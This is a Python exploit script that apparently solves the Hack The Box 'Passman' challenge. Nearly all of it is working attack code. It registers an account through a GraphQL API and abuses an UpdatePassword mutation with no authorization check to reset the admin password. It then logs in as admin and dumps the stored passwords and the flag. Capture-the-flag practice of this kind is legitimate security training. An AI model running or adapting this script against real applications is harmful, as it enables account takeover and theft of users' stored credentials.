import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def register(s, url):
	graphql_path = url + '/graphql'
	data = {
	"query": "mutation($email: String!, $username: String!, $password: String!) { RegisterUser(email: $email, username: $username, password: $password) { message } }",
	"variables": {
		"email": "gwyo@gwyo.com",
		"username": "gwyo",
		"password": "gwyopass"
		}
	}
	print('\n[+] Trying to register to the application...')
	time.sleep(1)
	print(data)
	r = s.post(graphql_path, json=data)
	time.sleep(1)
	print(r.text)
	time.sleep(1)

	print('\n[+] Trying to login to the application...')
	data = {
	"query": "mutation($username: String!, $password: String!) { LoginUser(username: $username, password: $password) { message, token } }",
	"variables": {
		"username":"gwyo",
		"password":"gwyopass"
		}
	}
	time.sleep(1)
	print(data)
	r = s.post(graphql_path, json=data)
	time.sleep(1)
	print(r.text)
	time.sleep(1)
	jwt_token = re.search(r'message":"User logged in successfully!","token":"(.*)"}}', r.text).group(1)
	print('[+] Found JWT managed session cookie:\t\t%s' % jwt_token)
	return jwt_token

def get_admin(s, url, token):
	print("\n[+] Trying to change admin's password using the UpdatePassword function...")
	graphql_path = url + '/graphql'
	cookies = {'session': token}
	data = {
	"query": "mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message, token } }",
	"variables": {
		"username":"admin",
		"password":"gwyopass"
		}
	}
	time.sleep(1)
	print(data)
	r = s.post(graphql_path, json=data, cookies=cookies)
	time.sleep(1)
	print(r.text)
	time.sleep(1)
	print('\n[+] Trying to login to the application as admin...')
	data = {
	"query": "mutation($username: String!, $password: String!) { LoginUser(username: $username, password: $password) { message, token } }",
	"variables": {
		"username":"admin",
		"password":"gwyopass"
		}
	}
	time.sleep(1)
	print(data)
	r = s.post(graphql_path, json=data)
	time.sleep(1)
	print(r.text)
	time.sleep(1)
	jwt_token = re.search(r'message":"User logged in successfully!","token":"(.*)"}}', r.text).group(1)
	print('[+] Found JWT managed session cookie:\t\t%s' % jwt_token)
	return jwt_token

def get_flag(s, url, token):
	print("\n[+] Trying to send a SQL request through the API...")
	graphql_path = url + '/graphql'
	cookies = {'session': token}
	data = {
	"query": "{ getPhraseList { id, owner, type, address, username, password, note } }"
	}
	time.sleep(1)
	print(data)
	r = s.post(graphql_path, json=data, cookies=cookies)
	time.sleep(1)
	print(r.text)
	time.sleep(1)
	print('\n')
	flag = re.search(r'"username":"admin","password":"(.*)","note":"password"', r.text).group(1)
	if 'HTB' in flag:
		print(flag)

def show_usage():
	print('[+] Usage: %s <TARGET>' % sys.argv[0])
	print('[+] Example: %s 127.0.0.1:1337' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] HTB Challenge: Passman')
	try:
		url = 'http://' + sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find Vulnerabilities in the graphql calls in the application flaws\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			token = register(s, url)
			new_token = get_admin(s, url, token)
			get_flag(s, url, new_token)
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(1)

if __name__ == "__main__":
	main()
